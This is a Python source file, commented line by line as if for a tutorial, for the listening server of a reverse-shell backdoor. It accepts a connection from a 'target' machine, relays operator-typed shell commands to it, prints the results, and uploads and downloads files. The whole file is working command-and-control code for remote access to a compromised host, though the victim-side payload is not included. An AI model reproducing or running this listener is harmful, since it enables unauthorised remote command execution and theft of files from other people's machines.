# Import Socket, os and JSON libraries
import socket
import json
import os

# Used to carry the commands inputted by the server.
def reliable_send(data):
	# jsondata is the variable storing the output of the json.dumps() function on the input command
	# Why use json.dumps()? json.dumps() function converts the input into a string that can be transmitted over a network.
	# Python is no good at creating useable / transmittable strings, but JSON conventions do just that for transmittability.
	jsondata = json.dumps(data)
	# 'target' refers to the variable defined later in the program.
	target.send(jsondata.encode())

def reliable_recv():
	# First, create a 'data' variable with an empty string
	data = ''
	#then create an infinite loop for receiving responses from the target
	while True:
		try:
			# The 'recv' function below is a from the 'socket' library and takes the data from the target ip defined later in the program.
			# 1024 is the number of bytes to process. We also decode the data (encoded above with jsondata.encode()).
			# rstrip() removes trailing characters from the 1024 byte length.
			data = data + target.recv(1024).decode().rstrip()
			# Using json.loads() to return the received info from the target - string is created with json.dumps() and read with json.loads().
			return json.loads(data)
		except ValueError:
			continue

# Create the upload_file function corresponding to the download_file function below.
def upload_file(file_name):
	# The reason we 'read bytes' is because the server  is reading data only. The TARGET writes the data that is read by the SERVER to the target machine.
	f = open(file_name, 'rb')
	# Now that the SERVER has 'read bytes' into memory, it can be sent via the socket using target.send with the contents of the file (from the above line).
	target.send(f.read())

def download_file(file_name):
	# Set the variable 'f' to OPEN a file of the same name as the target file by using the 'write bites' function.
	# We can then use other functions like f.write and f.close to WRITE to the file and then CLOSE the file once fully copied (downloaded).
	f = open(file_name, 'wb')
	# Set a timeout in the function so that if there is an issue with writing the file contents the program doesn't crash.
	target.settimeout(1)
	# Set 'chunk' variable to contain the next 1,024 bytes of the file to be downloaded.
	chunk = target.recv(1024)
	# The 'while' loop keeps returning data so long as 'chunk' has data left to transfer.
	while chunk:
		# This writes the next 1,024 bytes to the file.
		f.write(chunk)
		# We then try to write another batch of data to the 'chunk' variable.
		try:
			chunk = target.recv(1024)
		# if there is no more data to write, the timeout will be hit and the loop will break (the file has been fully copied).
		except socket.timeout as e:
			break
	# Remove the timeout from the function now that the file has been fully-written.
	target.settimeout(None)
	# Close the file now that it has been fully copied.
	f.close()

# Used to send commands to the target system and receive responses from the target system
def target_communication():
	# Create infinite loop
	while True:
		# Create a variable from user input with a shell-type prompt including the target IP (%s returns the 'ip' variable defined later on as a string.
		command = input('** Target~%s: ' %str(ip))
		# reliable_send function defined as the function that send the input commend to the target.
		reliable_send(command)
		# if the input is 'quit', then break the infinite loop, closing the connection with the target.
		if command == 'quit':
			break
		# If the input begind with 'cd ', do nothing else (the command will be sent to the target, and the server will pass and go back to the start of the infinite loop)
		elif command[:3] == 'cd ':
			pass
		# If the command received is 'clear', then use the os library to issue a 'clear' command on the local (server) machine
		elif command == 'clear':
			os.system('clear')
		# If the command received starts with 'download', call the newly-created 'download_file' function coded above.
		elif command[:8] == 'download':
			download_file(command[9:])
		# If the command received starts with 'upload', call the newly-created 'upload_file' function coded above.
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			# so long as the input isn't 'quit', the target response to the input command will be stored as variable 'result'.
			# the 'result' variable will be created from the new function above, 'reliable_recv', which returns the target response to the input command 'command', which is sent by function reliable_send().
			result = reliable_recv()
			# ... then the variable is printed!
			print(result)

print('[+] Initiating server...')

# Create the socket and bind to the IP and port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.86.32', 1988))

print('[+] Server initiated successfully!')

print('[+] Listening for incoming connections...')

# Start listening for up to 10 connections
sock.listen(10)

# Set the variable for storing the accepted connection (the socket object and the incoming IP)
target, ip = sock.accept()
print('[+] Incoming connection from: ' + str(ip))

target_communication()
